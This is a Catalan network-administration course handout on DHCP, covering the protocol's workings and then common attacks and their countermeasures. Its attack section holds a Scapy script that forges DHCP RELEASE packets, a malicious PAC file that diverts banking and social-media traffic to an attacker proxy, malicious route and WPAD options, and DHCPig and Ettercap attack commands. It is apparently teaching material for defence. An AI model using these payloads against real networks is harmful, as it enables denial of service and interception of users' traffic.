# Protocol DHCP (Dynamic Host Configuration Protocol)

En aquest markdown teniu un resum de les diapositives vistes a classe, així com activitats d'ampliació. És molt recomanable que intenteu fer aquestes activitats. Amb les hores de classe no hi ha suficient per veure tot lo que s'hauria de veure.

* **Autor**: Francesc Barragán
* **Darrera Actualització**: 01/09/2025

## Què és DHCP?

El **DHCP** (Dynamic Host Configuration Protocol) és un protocol de xarxa que permet assignar automàticament configuracions de xarxa als dispositius clients. Opera a la capa d'aplicació del model OSI i utilitza els ports UDP 67 (servidor) i 68 (client).

## Objectius principals

- **Automatització**: Elimina la configuració manual d'adreces IP
- **Centralització**: Gestió centralitzada de la configuració de xarxa
- **Optimització**: Reutilització eficient d'adreces IP
- **Simplicitat**: Facilita la connexió de nous dispositius a la xarxa

## Informació que proporciona DHCP

### Configuració bàsica

- **Adreça IP** del client
- **Màscara de subxarxa**
- **Porta d'enllaç predeterminada** (gateway)
- **Servidors DNS** primari i secundari

### Configuració adicional (opcions)

- Servidor de temps (NTP)
- Nom del domini
- Servidors WINS
- Rutes estàtiques específiques
- Durada del lloguer (lease time)

## Funcionament: Procés DORA

El protocol DHCP segueix un procés de 4 passos conegut com a **DORA**:

### 1. **DISCOVER** (Descobriment)

- El client envia un missatge de **broadcast** (255.255.255.255)
- Busca servidors DHCP disponibles a la xarxa
- Utilitza l'adreça origen 0.0.0.0 ja que encara no té IP

### 2. **OFFER** (Oferta)

- Els servidors DHCP responen amb una **oferta**
- Proposen una adreça IP disponible i configuració
- Reserven temporalment l'adreça oferida

### 3. **REQUEST** (Sol·licitud)

- El client **accepta** una de les ofertes rebudes
- Envia un missatge REQUEST (també per broadcast)
- Indica quin servidor ha escollit

### 4. **ACK** (Confirmació)

- El servidor escollit envia un **ACK** (Acknowledgment)
- Confirma l'assignació i envia la configuració completa
- El client ja pot utilitzar l'adreça IP

## Tipus de configuració DHCP

### 1. **Dinàmica**

- Assignació automàtica d'IPs disponibles
- Les adreces es reutilitzen quan expira el lloguer
- Més eficient per a xarxes amb molts dispositius

### 2. **Estàtica (Reservada)**

- Adreça IP fixa assignada a una MAC específica (Ho decideix el Sysadmin)
- Sempre la mateixa IP per al mateix dispositiu
- Ideal per a servidors i equips crítics

### 3. **Automàtica**

- Assignació permanent la primera vegada (Ho decideix el servidor DHCP)
- L'adreça no canvia mai un cop assignada
- Poc utilitzada en la pràctica

## Conceptes clau

### **Lease Time (Temps de lloguer)**

- Durada de l'assignació d'una adreça IP
- El client ha de renovar abans que expiri
- Valors típics: 24 hores, 7 dies

### **Scope (Àmbit)**

- Rang d'adreces IP disponibles per assignar
- Exemple: 192.168.1.100 - 192.168.1.200
- Exclou adreces reservades per a servidors

### **Renovació**

- Procés automàtic quan s'arriba al 50% del lease time
- El client sol·licita renovar la mateixa IP
- Si falla, intenta al 87.5% del temps

## DHCP Relay Agent

Quan els clients DHCP estan en una subxarxa diferent del servidor:

- Els **routers** actuen com a agents de retransmissió
- Converteixen broadcasts en missatges unicast
- Permeten centralitzar un servidor DHCP per a múltiples xarxes
- Configurat amb la comanda `ip helper-address` en Cisco

## Avantatges de DHCP

- **Reducció d'errors**: Elimina configuracions manuals incorrectes
- **Gestió centralitzada**: Control des d'un punt únic
- **Mobilitat**: Els dispositius es connecten automàticament
- **Escalabilitat**: Fàcil afegir nous dispositius
- **Optimització**: Reutilització d'adreces IP

## Desavantatges i consideracions

- **Punt únic de fallada**: Si el servidor DHCP falla, no hi ha assignacions
- **Seguretat**: Possible suplantació de servidors DHCP
- **Dependència de xarxa**: Sense connectivitat no hi ha configuració
- **Latència inicial**: Retard en obtenir configuració de xarxa

## Implementacions principals

### **Windows Server**

- Rol de servidor DHCP integrat
- Interfície gràfica completa
- Integració amb Active Directory

### **ISC DHCP**

- Servidor DHCP de referència en Linux/Unix
- Configuració via fitxers de text
- Molt flexible i potent

### **Dnsmasq**

- Solució lleugera per a xarxes petites
- Combina DHCP i DNS
- Popular en routers domèstics

## Configuració bàsica (exemple)

```text
# Configuració típica d'un scope
Xarxa: 192.168.1.0/24
Rang DHCP: 192.168.1.100 - 192.168.1.200
Gateway: 192.168.1.1
DNS: 8.8.8.8, 8.8.4.4
Lease Time: 24 hores
```

## Ordres útils per a diagnòstic

### Windows

- `ipconfig /all` - Mostra configuració actual
- `ipconfig /release` - Allibera l'adreça IP
- `ipconfig /renew` - Renova l'adreça IP

### Linux

- `dhclient -r` - Allibera l'adreça IP
- `dhclient` - Sol·licita nova configuració
- `ip addr show` - Mostra configuració actual


## Punts importants per a exàmens

1. **DORA**: Recordar l'ordre i funció de cada pas
2. **Ports**: UDP 67 (servidor) i 68 (client)
3. **Broadcast vs Unicast**: Quan s'utilitza cada un
4. **Lease Time**: Quan i com es renova
5. **DHCP Relay**: Necessari per a múltiples subxarxes
6. **Tipus d'assignació**: Dinàmica, estàtica i automàtica

## Exercicis Bàsics

* [Exercici 4: Configuració d'un DHCP en un dispositiu físic](./M0375_NF1_dhcp_exercici4.md)

## Activitats DHCP Avançades

* [Activitat Ampliació 1: Anàlisi de Vulnerabilitats DHCP](./M0375_NF1_dhcp_activitat1.md)
* [Activitat Ampliació 2: Implementació d'un Atac DHCP Starvation](./M0375_NF1_dhcp_activitat2.md)
* [Activitat Ampliació 3: Configuració de DHCP Snooping](./M0375_NF1_dhcp_activitat3.md)
* [Activitat Ampliació 4: Auditoria de Seguretat DHCP](./M0375_NF1_dhcp_activitat4.md)
* [Activitat Ampliació 5: Implementació de DHCPv6 Segur](./M0375_NF1_dhcp_activitat5.md)
* [Activitat Ampliació 6: Monitoratge i Detecció d'Anomalies DHCP](./M0375_NF1_dhcp_activitat6.md)

## Informació rellevant

* [Evolució del DHCP a Linux amb la discontinuitat de ISC](./M0375_NF1_dhcp_linux_futur.md)
  
# Possibles atacs contra Serveis DHCP

## Índex
1. [DHCP Starvation (Esgotament DHCP)](#1-dhcp-starvation-esgotament-dhcp)
2. [Rogue DHCP Server (Servidor DHCP Maliciós)](#2-rogue-dhcp-server-servidor-dhcp-maliciós)
3. [DHCP Spoofing Avançat](#3-dhcp-spoofing-avançat)
4. [DHCP Option Injection](#4-dhcp-option-injection-injecció-dopcions-dhcp)
5. [DHCP Release/Renew Attacks](#5-dhcp-releaserenew-attacks-atacs-de-alliberamentrrenovació)
6. [DHCP Relay Attacks](#6-dhcp-relay-attacks-atacs-a-relay-dhcp)
7. [DHCP Fingerprinting](#7-dhcp-fingerprinting-i-intelligence-gathering)
8. [Contramedides](#contramedides-específiques-per-cada-atac)

---

## 1. DHCP Starvation (Esgotament DHCP)

### Funcionament Detallat

L'atacant genera múltiples paquets DHCP DISCOVER amb adreces MAC falsificades. Cada paquet simula ser un dispositiu diferent sol·licitant una IP. El servidor DHCP assigna una adreça IP a cada MAC falsa fins que s'esgota el pool d'adreces disponibles.

### Procés Tècnic

1. **Descobriment del rang DHCP:** L'atacant identifica l'abast d'IPs disponibles
2. **Generació de MACs falses:** Crea adreces MAC úniques algorítmicament
3. **Flood de DISCOVER:** Envia massivament paquets DHCP DISCOVER
4. **Manteniment dels leases:** Renova periòdicament per mantenir les IPs ocupades

### Variants Avançades

- **Targeted starvation:** Se centra en subxarxes específiques
- **Intelligent starvation:** Deixa algunes IPs lliures per evitar detecció
- **Coordinated attack:** Múltiples atacants des de diferents punts

### Impacte

- Denegació de servei per a nous dispositius
- Interrupció de la connectivitat de xarxa
- Clients legítims que no poden obtenir IP

### Detecció

- Pool d'adreces DHCP al 100% d'ocupació sobtadament
- Gran nombre de MACs noves en logs DHCP
- Queixes d'usuaris sobre impossibilitat de connectar-se

---

## 2. Rogue DHCP Server (Servidor DHCP Maliciós)

### Implementació Detallada

#### Fase de Preparació

1. **Reconeixement de xarxa:** Identificar la configuració DHCP actual
2. **Posicionament estratègic:** Situar-se físicament o lògicament a la xarxa
3. **Configuració del servidor maliciós:** Crear un perfil DHCP atractiu (més lease time)

### Estratègies d'Atac

- **Speed advantage:** Respondre més ràpid que el servidor legítim
- **Attractive offers:** Oferir lease times més llargs
- **Selective targeting:** Atacar només dispositius específics

### Payloads Maliciosos Comuns

- **DNS Poisoning:** Servidor DNS controlat per l'atacant
- **Gateway redirection:** Tot el tràfic passa per l'atacant
- **Proxy injection:** Configuració automàtica de proxy maliciós
- **WPAD exploitation:** Web Proxy Auto-Discovery maliciós

---

## 3. DHCP Spoofing Avançat

### Tècniques Sofisticades

#### Man-in-the-Middle DHCP

1. **Interceptació:** Captura paquets DHCP DISCOVER legítims
2. **Anàlisi:** Extreu informació del client (hostname, vendor, etc.)
3. **Personalització:** Crea respostes específiques per cada client
4. **Injecció:** Envia DHCP OFFER personalitzat abans del servidor real

#### DHCP Race Condition

- Explota el timing entre DISCOVER i OFFER
- Utilitza múltiples interfícies per augmentar velocitat
- Implementa cache de respostes preparades

#### Session Hijacking via DHCP

```python
# Pseudocodi d'atac
def dhcp_hijack(target_mac, target_ip):
    # Enviar DHCP RELEASE fals per alliberar la IP
    send_dhcp_release(target_mac, target_ip)
    
    # Immediatament sol·licitar la mateixa IP
    send_dhcp_discover(attacker_mac)
    
    # Configurar IP amb gateway maliciós
    configure_malicious_dhcp_offer(target_ip)
```

---

## 4. DHCP Option Injection (Injecció d'Opcions DHCP)

### Opcions DHCP Crítiques per Atacar

#### Opció 121 - Static Routes (Rutes Estàtiques)

```bash
# Exemple d'injecció maliciosa
option classless-static-routes 
    8, 10.0.0.0, 192.168.1.10,     # Redirigir 10.0.0.0/8 a atacant
    24, 192.168.2.0, 192.168.1.10, # Redirigir subxarxa específica
    0, 192.168.1.1;                 # Gateway per defecte original
```

#### Opció 252 - Proxy Auto-Config

```bash
option web-proxy-auto-discovery-url "http://192.168.1.10/wpad.dat";
```

##### Contingut del Fitxer PAC Maliciós

```javascript
function FindProxyForURL(url, host) {
    // Interceptar tràfic bancari
    if (shExpMatch(host, "*.bank.com") || shExpMatch(host, "*banking*")) {
        return "PROXY 192.168.1.10:8080";
    }
    
    // Interceptar tràfic social media
    if (shExpMatch(host, "*.facebook.com") || shExpMatch(host, "*.twitter.com")) {
        return "PROXY 192.168.1.10:8080";
    }
    
    // Permetre altre tràfic directament
    return "DIRECT";
}
```

#### Altres Opcions Importants

- **Opció 15 - Domain Name:** Canviar domini per DNS spoofing
- **Opció 119 - Domain Search List:** Manipular l'ordre de cerca de dominis
- **Opció 6 - DNS Servers:** Redirigir tot el DNS
- **Opció 3 - Default Gateway:** Control total del routing

---

## 5. DHCP Release/Renew Attacks (Atacs de Alliberament/Renovació)

### DoS Intermitent

#### DHCP Release Attack

```python
# Tècnica d'atac
import scapy.all as scapy

def dhcp_release_attack(target_range, dhcp_server):
    for target_ip in target_range:
        # Obtenir MAC associada a la IP
        target_mac = get_mac_for_ip(target_ip)
        
        # Crear paquet DHCP RELEASE fals
        dhcp_release = scapy.DHCP(options=[
            ("message-type", "release"),
            ("server_id", dhcp_server),
            ("end")
        ])
        
        packet = (scapy.Ether(dst="ff:ff:ff:ff:ff:ff", src=target_mac) /
                  scapy.IP(src=target_ip, dst=dhcp_server) /
                  scapy.UDP(sport=68, dport=67) /
                  scapy.BOOTP(chaddr=target_mac, ciaddr=target_ip) /
                  dhcp_release)
        
        scapy.sendp(packet)
```

#### DHCP Decline Attack

- Envia DHCP DECLINE per marcar IPs com "in use"
- Simula conflictes d'IP per crear confusió
- Força al servidor a marcar IPs com no disponibles

#### Renewal Hijacking

1. **Monitorització:** Detectar quan clients intenten renovar
2. **Interceptació:** Capturar paquets DHCP REQUEST
3. **Competició:** Enviar DHCP NAK abans del servidor legítim
4. **Substitució:** Oferir nova configuració quan el client torna a DISCOVER

---

## 6. DHCP Relay Attacks (Atacs a Relay DHCP)

### Man-in-the-Middle via Relay

#### Relay Agent Spoofing

- Simular ser un relay agent legítim
- Interceptar sol·licituds entre subredes
- Modificar Option 82 (Relay Agent Information)

#### Tècnica GIADDR Manipulation

```bash
# Modificar camp GIADDR en paquets relay
Original: GIADDR = 192.168.1.1 (subnet A)
Maliciós: GIADDR = 192.168.2.1 (subnet B controlada per atacant)
```

#### Option 82 Injection

```python
# Exemple d'injecció maliciosa
option_82 = {
    'circuit_id': b'\x01\x04\x00\x10\x00\x01',  # Port fals
    'remote_id': b'\x02\x06attacker_switch'      # Switch controlat
}
```

---

## 7. DHCP Fingerprinting i Intelligence Gathering

### Passive Information Gathering

#### Anàlisi d'Opcions DHCP Sol·licitades

- **Opció 55 (Parameter Request List):** Revela SO i aplicacions
- **Vendor Class Identifier:** Identifica tipus de dispositiu
- **Hostname option:** Revela informació d'usuari

#### Device Classification

```python
# Signatures comuns
signatures = {
    "MSFT 5.0": "Windows XP/Vista",
    "MSFT 98": "Windows 98",
    "android-dhcp": "Android Device", 
    "iPhone": "iOS Device",
    "DHCP Zyxel": "Router Zyxel",
    "udhcp": "Dispositiu Linux embedded",
    "DHCP VendorClass": "Equip de xarxa"
}

def identify_device(vendor_class, parameter_list):
    if vendor_class in signatures:
        device_type = signatures[vendor_class]
    else:
        device_type = analyze_parameters(parameter_list)
    
    return device_type
```

### Active Probing

- Enviar DHCP INFORM per obtenir configuració sense lease
- Utilitzar opcions específiques per triggering responses
- Timing analysis per fingerprinting de servidor

---

## Contramedides Específiques per Cada Atac

### Contra DHCP Starvation

#### Configuració Cisco Switch

```cisco
# Habilitar DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10,20,30

# Limitar rate de paquets DHCP per port
interface range GigabitEthernet0/1-24
 ip dhcp snooping limit rate 10  # Màxim 10 paquets/segon
 
# Configurar ports trusted (uplinks)
interface GigabitEthernet0/48
 ip dhcp snooping trust
```

#### Configuració HP/Aruba Switch

```bash
dhcp-snooping
dhcp-snooping vlan 10,20,30
dhcp-snooping trust GigabitEthernet1/0/48
dhcp-snooping max-binding 1000
```

### Contra Rogue DHCP Server

#### DHCP Snooping Avançat

```cisco
# Configuració completa DHCP Snooping
ip dhcp snooping
ip dhcp snooping vlan 10-50

# Ports trusted només per a servidors DHCP legítims
interface GigabitEthernet0/1
 description "Conexio a servidor DHCP legítim"
 ip dhcp snooping trust
 
# Tots els altres ports com untrusted
interface range GigabitEthernet0/2-47
 ip dhcp snooping limit rate 5
 
# Habilitar detecció d'ofertes múltiples
ip dhcp snooping information option
ip dhcp snooping verify mac-address
```

#### Detecció d'Anomalies

```bash
#!/bin/bash
# Script de monitorització DHCP
LOG_FILE="/var/log/dhcp-monitor.log"

# Monitoritzar múltiples servidors DHCP
tcpdump -i any port 67 -l | while read line; do
    echo "$line" | grep "DHCP.*Offer" | awk '{
        server_ip = $x  # Extreure IP del servidor
        if (server_ip != "192.168.1.1") {
            print "[ALERT] Rogue DHCP detected from:", server_ip
        }
    }' >> $LOG_FILE
done
```

### Contra Option Injection

#### Filtrat d'Opcions Perilloses

```python
# Exemple de filtrat en proxy DHCP
DANGEROUS_OPTIONS = [121, 252, 15, 119, 249]

def filter_dhcp_options(dhcp_packet):
    filtered_options = []
    
    for option in dhcp_packet.options:
        option_code = option[0] if isinstance(option[0], int) else ord(option[0])
        
        if option_code not in DANGEROUS_OPTIONS:
            filtered_options.append(option)
        else:
            print(f"[WARNING] Blocked dangerous DHCP option {option_code}")
    
    dhcp_packet.options = filtered_options
    return dhcp_packet
```

### Contra Release/Renew Attacks

#### Dynamic ARP Inspection (DAI)

```cisco
# Habilitar DAI
ip arp inspection vlan 10-50

# Configurar trusted ports per DAI
interface GigabitEthernet0/48
 ip arp inspection trust
 
# Rate limiting per ARP
ip arp inspection limit rate 15

# Validacions addicionals
ip arp inspection validate src-mac dst-mac ip
```

#### IP Source Guard

```cisco
# Habilitar IP Source Guard
interface range GigabitEthernet0/1-47
 ip verify source port-security
 ip verify source dhcp-snooping
```

### Monitorització i Logging Avançat

#### Script de Monitorització Complet

```bash
#!/bin/bash
# Monitor DHCP comprehensiu

LOG_DIR="/var/log/dhcp-security"
mkdir -p $LOG_DIR

# Monitoritzar anomalies DHCP
tcpdump -i any -w $LOG_DIR/dhcp-$(date +%Y%m%d).pcap port 67 or port 68 &

# Anàlisi en temps real
tail -f /var/log/syslog | grep -i dhcp | while read line; do
    # Detectar múltiples ofertes
    if echo "$line" | grep -q "DHCPOFFER"; then
        server=$(echo "$line" | grep -o '[0-9]\+\.[0-9]\+\.[0-9]\+\.[0-9]\+')
        echo "$(date): DHCP Offer from $server" >> $LOG_DIR/offers.log
    fi
    
    # Detectar starvation
    if echo "$line" | grep -q "no free leases"; then
        echo "$(date): [CRITICAL] DHCP Pool exhausted!" >> $LOG_DIR/alerts.log
        # Enviar alerta
        mail -s "DHCP Pool Exhausted" admin@company.com < $LOG_DIR/alerts.log
    fi
done
```

#### SNMP Monitoring per DHCP

```python
import pysnmp
from pysnmp.hlapi import *

def monitor_dhcp_pool():
    # OID per pool utilization (exemple Cisco)
    pool_oid = '1.3.6.1.4.1.9.9.101.1.2.1.1.6'
    
    for (errorIndication, errorStatus, errorIndex, varBinds) in nextCmd(
        SnmpEngine(),
        CommunityData('public'),
        UdpTransportTarget(('dhcp-server-ip', 161)),
        ContextData(),
        ObjectType(ObjectIdentity(pool_oid)),
        lexicographicMode=False):
        
        if errorIndication:
            print(errorIndication)
            break
        elif errorStatus:
            print(f"{errorStatus} at {errorIndex}")
            break
        else:
            for varBind in varBinds:
                pool_usage = int(varBind[1])
                if pool_usage > 90:  # 90% utilitzat
                    send_alert(f"DHCP Pool at {pool_usage}% capacity")
```

## Eines d'Atac Comunes

### Yersinia

- Framework per atacs de capa 2
- Interfície gràfica i de línia de comandes
- Suport per múltiples protocols incloent DHCP

### DHCPig

```bash
# Exemple d'ús DHCPig per starvation
./dhcpig.py -i eth0 -v
```

### Scapy (Python)

```python
# Exemple d'atac personalitzat
from scapy.all import *

def custom_dhcp_attack():
    # Crear paquet DHCP maliciós
    dhcp_discover = DHCP(options=[("message-type","discover"),"end"])
    # ... rest del codi
```

### Ettercap

```bash
# Atac man-in-the-middle amb DHCP spoofing
ettercap -T -M dhcp:192.168.1.0/24/192.168.1.1,192.168.1.254 -P dns_spoof
```

---

## Recomanacions de Seguretat

### Implementació per Capes

1. **Capa Física:** Control d'accés físic als switches
2. **Capa 2:** DHCP Snooping, Port Security, DAI
3. **Capa 3:** IP Source Guard, ACLs
4. **Capa d'Aplicació:** Monitorització i alertes

### Auditoria Regular

- Revisió periòdica de logs DHCP
- Verificació de configuracions de seguretat
- Tests de penetració interns
- Actualització de signatures de detecció

### Documentació i Formació

- Procediments d'incident response per atacs DHCP
- Formació del personal en detecció d'anomalies
- Mantenir inventari actualitzat de dispositius de xarxa

---

*Document generat per a fins educatius i de conscienciació en seguretat de xarxes.*
